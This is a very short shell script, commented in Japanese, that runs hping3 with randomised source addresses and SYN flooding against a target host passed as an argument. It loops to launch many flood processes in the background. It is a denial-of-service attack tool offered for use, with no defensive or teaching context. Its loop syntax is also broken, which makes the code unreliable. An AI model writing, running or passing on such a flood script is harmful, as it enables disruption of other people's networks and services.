#!/bin/sh

#起動する前にhping3をインストールしてネ！
n = 0
while n < $1 :
do 
	hping3 --rand-source --flood -S $2 &
done
